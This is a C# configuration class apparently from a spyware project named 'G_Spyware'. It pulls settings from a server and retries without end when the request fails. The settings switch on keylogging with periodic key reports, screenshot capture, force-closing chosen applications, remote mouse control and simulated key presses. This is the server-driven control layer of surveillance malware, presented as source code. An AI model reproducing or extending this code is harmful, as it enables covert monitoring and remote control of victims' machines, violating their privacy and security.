using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Web.Script.Serialization;

namespace IDK {

    /// <summary>
    /// Class containing configuration of the application
    /// </summary>
    class Config {

        // base url used by the application
        public const string SERVER_BASE_URL = "http://localhost/G_Spyware/";

        // class instance used by the singleton design pattern
        private static Config Instance;

        // settings used by the application
        public AppSettings Settings;

        /// <summary>
        /// Class constructor
        /// </summary>
        private Config() {}

        /// <summary>
        /// Gets instance of Config class (singleton design pattern)
        /// </summary>
        /// <returns></returns>
        public static Config GetInstance() {
            if (ReferenceEquals(Instance, null)) {
                Instance = new Config();
            }

            return Instance;
        }

        /// <summary>
        /// Loads settings from the server
        /// </summary>
        public void LoadSettings() {
            Thread th = new Thread(new ThreadStart(GetSettingsFromServer));
            th.Start();
            th.Join();
        }

        /// <summary>
        /// Gets settings from the server and parses it into an AppSettings object
        /// </summary>
        private void GetSettingsFromServer() {
            try {
                using (StreamReader reader = new StreamReader(Network.MakeHttpRequest(SERVER_BASE_URL + "config/settings.json", "GET", null))) {
                    string JSON = reader.ReadToEnd();
                    Settings = new JavaScriptSerializer().Deserialize<AppSettings>(JSON);
                }
            } catch {
                GetSettingsFromServer();
            }
        }

        /// <summary>
        /// Class containing all settings for the application. Loaded from the server
        /// </summary>
        public class AppSettings {

            /*********** GENERAL ***************/
            public int CLOCK_TIME { get; set; }

            /*********** KEY LOGGING ***********/
            public bool LOG_KEYS { get; set; }
            public int KEY_REPORT_INTERVAL { get; set; }

            /*********** APP MANAGEMENT ***********/
            public bool CLOSE_APPS { get; set; }
            public int APP_CLOSING_INTERVAL { get; set; }
            public List<string> APPS_TO_CLOSE { get; set; }

            /*********** SCREENSHOTS ***********/
            public bool TAKE_SCREENSHOTS { get; set; }
            public int SCREENSHOT_INTERVAL { get; set; }

            /*********** MOUSE CONTROLS ***********/
            public bool CONTROL_MOUSE { get; set; }

            /*********** KEY CLICKING ***********/
            public bool CLICK_KEYS { get; set; }
        }
    }
}
